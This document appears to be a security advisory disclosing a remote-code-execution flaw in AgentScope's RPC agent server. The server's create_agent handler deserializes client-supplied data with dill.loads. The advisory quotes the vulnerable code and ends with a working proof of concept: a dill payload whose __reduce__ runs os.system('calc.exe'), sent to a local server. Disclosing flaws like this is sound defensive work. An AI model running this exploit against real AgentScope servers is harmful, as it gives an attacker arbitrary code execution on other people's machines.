### Description

AgentScope implements an Actor-based distributed deployment and parallel optimization, providing features such as Automatic Parallel Optimization, Centralized Application Writing, Zero-Cost Automatic Migration. For Inter-process communication between agent server process and main process; AgentScope provided the `agentscope.rpc` module. The `create_agent` method allow main process to create new agents on agent server process; for agent instancing / reconstructing, the agent server process required `agent_source_code`. Typically, the `agent_source_code` sent by main process are considered harmlessly due to input limitations. However, since PRC channels are exposed and not limited by the native methods, attackers can reconstruct the original client-side create_agent, in order to parse malicious serialized object, triggering remote-code execution on the listen create_agent when loaded.

### Source-to-sink

https://doc.agentscope.io/en/tutorial/208-distribute.html introduced the methodology and the philosophy of `Agentscope`'s Distribution mechanism. In AgentScope, the process that runs the application flow is called the **main process**, and each agent can run in a separate process named **agent server process**. According to the different relationships between the main process and the agent server process, AgentScope supports two modes for each agent: **Child Process** and **Independent Process** mode.

Users can firstly serve a `RpcAgentServer` using the `RpcAgentServerLauncher`, aka the **agent server process** where the agents are separately run on, the registration of the `RpcAgentServerLauncher` required users to parse in `custom_agent_classes`, or users can specific the `parent_dir` of the defined agent class via `agent_dir`.

```python
# import some packages

# register models which can be used in the server
agentscope.init(
    model_configs=model_config_path_b,
)
# Create an agent service process
server = RpcAgentServerLauncher(
    host="ip_b",
    port=12002,
    custom_agent_classes=[AgentA, AgentB]
)

# Start the service
server.launch()
server.wait_until_terminate()
```

For main processes to communicate with the agent process; `agentscope` provided `agentscope.rpc packages`. users can first instance a [`RpcAgentClient`](https://doc.agentscope.io/en/agentscope.rpc.rpc_agent_client.html#agentscope.rpc.rpc_agent_client.RpcAgentClient) object specifying the host and the port of the agent process, then use `RpcAgentClient` attribution methods to communicate with it. For instance: `call_agent_func`, `delete_agent`, `get_server_info` etc.

Among all these attributes, `create_agent` served as a way to create agents from main process to agent process; for the agent process to construct a agent, `agent_id` and `agent_configs` is required in on hand locate the agent class, and instance it with the right parameters:

```python
    def create_agent(
        self,
        agent_configs: dict,
        agent_id: str = None,
    ) -> bool:
        try:
            with grpc.insecure_channel(f"{self.host}:{self.port}") as channel:
                stub = RpcAgentStub(channel)
                status = stub.create_agent(
                    agent_pb2.CreateAgentRequest(
                        agent_id=(
                            self.agent_id if agent_id is None else agent_id
                        ),
                        agent_init_args=dill.dumps(agent_configs),
                    ),
                )
                if not status.ok:
                    logger.error(
                        f"Error when creating agent: {status.message}",
                    )
                return status.ok
        except Exception as e:
            # check the server and raise a more reasonable error
            if not self.is_alive():
                raise AgentServerNotAliveError(
                    host=self.host,
                    port=self.port,
                    message=str(e),
                ) from e
```

`create_agent` firstly connects to the RPC channel via `grpc.insecure_channel(f"{self.host}:{self.port}")`, then parses both the `agent_id` and `agent_configs` into `CreateAgentRequest`, it's hard to find the definition of `CreateAgentRequest` but we can take a really close guess on what this method does. However, taking a closer look, the `agent_init_args` is serialized via `dill.dumps`. As we mentioned previously, an agent process can be opened via `RpcAgentServerLauncher`; defined in `src/agentscope/server/servicer.py`; from this file, we can locate the listener endpoint: same-name-named `create_agent`:

`src/agentscope/server/servicer.py`:`186`

```python
    def create_agent(
        self,
        request: agent_pb2.CreateAgentRequest,
        context: ServicerContext,
    ) -> agent_pb2.GeneralResponse:
        """Create a new agent on the server."""
        agent_id = request.agent_id
        with self.agent_id_lock:
            if agent_id in self.agent_pool:
                return agent_pb2.GeneralResponse(
                    ok=False,
                    message=f"Agent with agent_id [{agent_id}] already exists",
                )
            agent_configs = dill.loads(request.agent_init_args)
            if len(request.agent_source_code) > 0:
                cls = dill.loads(request.agent_source_code)
                cls_name = cls.__name__
                logger.info(
                    f"Load class [{cls_name}] from uploaded source code.",
                )
            else:
                cls_name = agent_configs["class_name"]
                try:
                    cls = AgentBase.get_agent_class(cls_name)
                except ValueError as e:
                    err_msg = (
                        f"Agent class [{cls_name}] not found: {str(e)}",
                    )
                    logger.error(err_msg)
                    return agent_pb2.GeneralResponse(ok=False, message=err_msg)
            try:
                agent_instance = cls(
                    *agent_configs["args"],
                    **agent_configs["kwargs"],
                )
            except Exception as e:
                err_msg = (
                    f"Failed to create agent instance <{cls_name}>: {str(e)}",
                )
                logger.error(err_msg)
                return agent_pb2.GeneralResponse(ok=False, message=err_msg)
            agent_instance._agent_id = agent_id  # pylint: disable=W0212
            self.agent_pool[agent_id] = agent_instance
            logger.info(f"create agent instance <{cls_name}>[{agent_id}]")
            return agent_pb2.GeneralResponse(ok=True)
```

here the agent process examine if the agent_id is a duplicate. However moving to the definition of the `agent_configs`, the `agent_configs` is directly retrieved from `dill.loads(request.agent_init_args)`, the previous mentioned `agent_pb2.CreateAgentRequest(` sink! dill's deserialization 's mechanism is similar to pickle using PVMs to handle operation codes, which allowed remote-code execution when malicious opcodes parsed into the dill deserialize-er.

### Exploitation

Here we can re-construct the client-side `create_agent` method to parse malicious dill payloads into the agent process listener, which will be then deserialized via `cls = dill.loads(request.agent_source_code)`, resulting remote-code execution. To begin with, we need to setup a victim side simulation:

```python
from agentscope.server import RpcAgentServerLauncher
import os

launcher = RpcAgentServerLauncher(
            host='127.0.0.1',
            port=12001,
            agent_dir=os.path.abspath(
                os.path.join(
                    os.path.abspath(os.path.dirname(__file__)),
                    "custom",
                ),
            ),
        )


launcher.launch()
```

as the `RpcAgentServerLauncher` being `launched` a RPC listener server will be listen on `127.0.0.1:12001`, here we can use the modified client-side `create_agent` to simulate a agent creating process, nevertheless parsing malicious dill payloads.

```python
import grpc
from agentscope.rpc.rpc_agent_pb2_grpc import RpcAgentStub
import agentscope.rpc.rpc_agent_pb2 as agent_pb2
import dill

from agentscope import rpc

class Malicious:
    def __reduce__(self):
        return (__import__('os').system, ("calc.exe",))

client = rpc.RpcAgentClient(host='127.0.0.1', port=12001, agent_id='custom_test')
custom_agent_id = "custom_test"


def create_agent(
) -> bool:
    try:
        host = '127.0.0.1'
        port = 12001
        agent_id = "custom_test"
        with grpc.insecure_channel(f"{host}:{port}") as channel:
            stub = RpcAgentStub(channel)
            status = stub.create_agent(
                agent_pb2.CreateAgentRequest(
                    agent_id=(
                        agent_id if agent_id is None else agent_id
                    ),
                    agent_init_args=dill.dumps(Malicious()),
                ),
            )
    except:
        pass

create_agent()
```

Here after the process being received and processed by `RpcAgentServer`, remote code will be triggered.

# Impact

Remote Code Execution